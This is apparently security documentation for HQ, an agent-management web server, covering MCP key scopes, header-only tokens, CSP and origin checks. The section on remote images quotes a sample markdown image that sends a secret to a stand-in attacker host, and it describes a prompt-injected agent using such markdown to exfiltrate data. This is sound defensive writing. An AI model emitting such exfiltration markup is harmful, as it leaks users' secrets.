# Web and MCP authentication

This covers the HTTP server that `hq start all` runs on port 5678: `/mcp`, the
REST API under `/api`, the chat socket `/ws`, and the PWA it serves. It closes
HQ-SEC-001, HQ-SEC-004 and HQ-SEC-005.

## `/mcp` fails closed

`/mcp` needs `AGENTHQ_API_KEY` (full access), `AGENTHQ_SPARK_API_KEY` (a
read-only tool allowlist) or `AGENTHQ_HANDOFF_API_KEY` (the read-only set minus
`harness_session_logs`, plus `task_create`, `task_update`, `task_comment_add`,
`harness_session_spawn`, `harness_session_handoff`, `hq_ask` and `hq_ask_result`, as listed in
`hq_mcp::gateway::HANDOFF_ALLOWLIST`; no deletes, no session stop, resume,
send or goal changes, no vault writes). **The handoff key is equivalent to
code execution on every configured Herdr host**: a spawned `claude-code`
session runs with permissions skipped. It cannot send to or read the output of
sessions (the registry does not record who started a session, so those tools
would reach sessions the key never started), but it can start an agent anywhere
`herdr.spawn_cwd_deny` allows. Set `herdr.handoff_cwd_allow` to the project
roots it may use; leave it empty only for a key you would hand a shell. The
gateway tells the tool the call came in on this key, so a client cannot claim
or drop the scope. Send the key as `Authorization: Bearer <key>` or
`x-api-key`. With none of the variables set, every call is refused with
"Unauthorized: this server has no AGENTHQ_API_KEY configured". A value reused
across scopes gets the narrowest one, and a tool missing from a scope's list is
denied, so a new tool stays out of the scoped keys until it is added by hand.

For local development only, `HQ_MCP_DEV_NO_AUTH=1` opens `/mcp` when no key is
configured. It is honoured only when `web_bind` is a loopback address and the
request carries no `Forwarded`, `X-Forwarded-For`, `X-Forwarded-Host`,
`X-Real-IP` or `Tailscale-User-Login` header. Every supported deployment puts
Caddy or `tailscale serve` in front, and both add forwarding headers, so the
switch has no effect there even if it is set by mistake. A configured key always
wins over the switch.

`hq_ask` and `hq_ask_result` (ask HQ's chat agent a question, see `docs/MCP_ASK.md`) follow the
same scoping. The full key may use `mode: full`, which gives the reply every tool a web chat turn
has. The handoff key may only ask in `read_only` mode, which runs the reply under the read-only
permission preset, and can read back only the asks it made. The Spark key has neither tool.
A handoff-key ask turn also loses the tools the handoff key is kept off (session logs and lists, Herdr panes, file and git readers, specialist sub-agents; see `docs/MCP_ASK.md`), and the key may continue only threads its own asks started in which the owner has typed nothing. Questions are capped at 20,000 characters, with 3 asks waiting at once, 6 new asks per minute and 200 per day per key. The gateway sets the
scope marker, so a client cannot claim `full` for a handoff call. The answer is model output and
must be treated as untrusted by the caller.

Generate a key with `openssl rand -hex 32` and keep it in a root-readable env
file loaded by the service (the sample unit layout uses `/opt/hq/mcp.env`, loaded by the
`hq.service.d/mcp-key.conf` drop-in).

`tools/list` returns the two gateway tools (`hq_discover`, `hq_call`) for every
key, never the registry. What differs by scope is the rest: `hq_discover` lists
only tools in the key's allowlist, `hq_call` refuses any other tool, and the
category names in the `hq_discover` description are limited to categories that
hold an allowed tool. `crates/hq-web/src/mcp_http.rs` tests all of this through
an HTTP router for the full, handoff and Spark keys, and a missing key.

## Files HQ writes

`config.yaml`, every backup of it (`.bak`, `.bak.N`, `.bak-model-switch`) and
the directory HQ creates for it are owner-only (0600 and 0700) on unix, and an
existing looser config is tightened the next time HQ saves it. Backups made by
earlier versions keep their old mode: run `chmod 600 ~/.hq/config.yaml*`. HQ
does not write `.env` files; create service env files such as `/opt/hq/mcp.env`
with mode 0600 owned by the service user.

## Web token: headers only

`web_auth_token` (env `HQ_WEB_AUTH_TOKEN`) guards `/ws` and `/api/*`. It is
accepted only as `Authorization: Bearer`. URL tokens (`?token=`) are refused,
because URLs end up in browser history, proxy logs and `Referer` headers.

- **Chat socket.** Browsers cannot set headers on a WebSocket, so the PWA calls
  `POST /api/ws-ticket` with the header and opens `/ws?ticket=<ticket>`. A
  ticket works once, expires after 30 seconds, and opens `/ws` only; at most 256
  are outstanding.
- **`hq chat --server`.** The CLI is not a browser, so it sends the token as a
  Bearer header on the `/ws` upgrade and needs no ticket. It reads the token
  from `HQ_WEB_AUTH_TOKEN` (or, for the local daemon only, `web_auth_token`).
  Loopback servers may use `http`/`ws`; any other host is refused unless a token
  is set and the URL is `https`/`wss`. Plain `hq chat` stays in-process.
  `--server` (or `HQ_CHAT_SERVER=auto` for a daemon on the loopback
  `web_bind`/`ws_port`) opts in, and before any token is sent the target's
  `/health` must answer with `"service": "agent-hq"`, so another program on
  that port never receives it. `--local` forces the in-process backend.
- **Session-changing requests.** `send` and `adopt` under
  `/api/harness-sessions/` must carry `X-HQ-Client` (the PWA's `hqFetch` adds it
  to every non-GET). `drive`, `goal` and `unwatch` predate the header and stay
  open so a cached PWA can still stop a session; a cross-site form post could
  toggle them on a token-less loopback setup. The origin guard trusts any loopback page when no web token
  is set, and a plain form post needs no preflight, so the header (which the CORS
  layer does not allow) is what keeps another local page from typing into an
  agent. The Vite dev server proxies `/api`, so it stays same-origin.
- **Vault files.** `<img>` tags and download links cannot send headers either.
  With a token set, the PWA fetches the file with the header and shows it from a
  blob URL (`src/lib/useAssetUrl.ts`). pdf.js gets the header directly.
- **First login.** A browser picks the token up once from a `#token=<token>`
  link and keeps it in local storage. The fragment never reaches the server.
  Old `?token=` links still work in the PWA but have already been logged by
  whatever proxy served the page, so rotate a token that was shared that way.

One exception remains: `/hooks/gmail` takes its own `GMAIL_WEBHOOK_SECRET`. Send
it as `Authorization: Bearer <secret>` whenever the sender can set headers. The
`?token=<secret>` form still works because Pub/Sub push subscriptions cannot set
headers, but a URL secret is recorded by any proxy access log in front of HQ
(Caddy logs request URIs when access logging is on), so prefer the header and
rotate the secret if a proxy log with the query form leaves your control. HQ
itself never writes the query string or the headers of this route to its logs
(tested with a log-capture layer). The secret only triggers an inbox poll.

## Response headers and vault files

Every response from the web server carries `X-Content-Type-Options: nosniff`,
`Referrer-Policy: no-referrer`, `X-Frame-Options: DENY`, and a
`Content-Security-Policy` built in `crates/hq-web/src/security_headers.rs`:

- `default-src 'self'`; `object-src 'none'`; `frame-ancestors 'none'`;
  `base-uri 'self'`; `form-action 'self'`; `img-src 'self' data: blob:`;
  `connect-src 'self' blob:` plus `ws://` and `wss://` for the request's own
  `Host` (only when it is a plain host[:port]), so older Safari lets the chat
  socket through.
- `script-src 'self' 'wasm-unsafe-eval'` plus a `sha256-` source for each inline
  script in the prerendered `index.html`. The shell carries a few inline
  bootstrap scripts, so a nonce-free strict policy needs their hashes. They are
  read when the server starts, so a new web build needs a restart (a deploy
  already restarts). No `unsafe-eval` and no `unsafe-inline` for scripts.
  `wasm-unsafe-eval` is for the syntax highlighter and pdf.js.
- `style-src 'self' 'unsafe-inline'`. React and the highlighter emit style
  attributes, which only `unsafe-inline` allows. This is the one relaxation.

**Remote images are blocked on purpose.** Notes and chat replies are rendered
from markdown that a prompt-injected agent or a shared note can write, and an
image URL is a way to send data out (`![](https://evil.example/p?d=<secret>)`).
Allowing `img-src https:` would make every rendered note an exfiltration channel,
so only same-origin, `data:` and `blob:` images load. The markdown viewer and
the HTML preview replace a remote `<img>` with the text `[remote image
blocked: alt]` (`apps/hq-web/src/lib/remoteImages.ts`). If remote images become
a feature, add `https:` to `img-src` knowing that tradeoff.

Inline script hashes must be computed on the text the HTML parser produces, not
the file's raw bytes: CRLF and lone CR become LF, NUL becomes U+FFFD, and
invalid UTF-8 becomes U+FFFD. The TanStack stream barrier contains raw NUL bytes,
so a raw-byte hash silently never matches and the app renders blank
(`security_headers::normalize_script_text`). `apps/hq-web/scripts/csp-smoke.mjs`
loads the served app in headless Chromium and fails on any CSP violation or a
blank page; it needs the optional `playwright` package and skips without it
(`CSP_SMOKE_REQUIRED=1` turns the skip into a failure).

The built-app CSP tests in `crates/hq-web/src/lib.rs` need `bun run build` in
`apps/hq-web`. They skip when `dist/` is missing, unless `HQ_REQUIRE_BUILT_APP=1`
is set, which makes the skip a failure. CI should build the app and set it.

`/api/vault-asset` serves `svg`, `html`, `htm`, `xhtml` and `xml` files with
`Content-Disposition: attachment` and `Content-Security-Policy: sandbox`, so
opening one of those URLs cannot run script on HQ's origin. The PWA shows
vault images through blob URLs, which this does not affect.

## Cross-origin requests

CORS only hides responses from a hostile page. It does not stop the request
itself, and it does not apply to WebSockets. So `origin::origin_guard` refuses a
request to `/api`, `/ws` or `/mcp` when:

- it carries an `Origin` that is not a loopback origin, not listed in
  `web_allowed_origins`, and not the server's own origin (`Origin` authority
  equal to `Host`); or
- no web token is set and its `Host` is neither a loopback name nor the host of
  a `web_allowed_origins` entry. This stops DNS rebinding, where a hostile name
  resolves to 127.0.0.1 and the page becomes same-origin with HQ.

CORS grants read access to the same set of origins and no others. Requests with
no `Origin` (curl, MCP clients, the Telegram relay) are not affected.

List every origin the PWA is served from, including the port:

```yaml
web_allowed_origins:
  - https://hq.example.ts.net:8443
  - https://hq.example.ts.net:8444
```

If the PWA loads but every API call returns 403 "unrecognised Host header", the
origin it is served from is missing from this list.

## Residual risks

- A browser extension, or any process on the same machine, can make requests
  without an `Origin` header. Unauthenticated loopback mode trusts the machine,
  so set `web_auth_token` on shared machines.
- The token lives in the PWA's local storage, so script injection into the PWA
  would expose it. Vault HTML is sanitised with DOMPurify before rendering.
- Tested with Axum request-level tests (`crates/hq-web/src/origin.rs`,
  `auth.rs`, `lib.rs`). They send the `Origin` and `Host` headers that Chrome,
  Firefox and Safari send, but no real browser runs them.
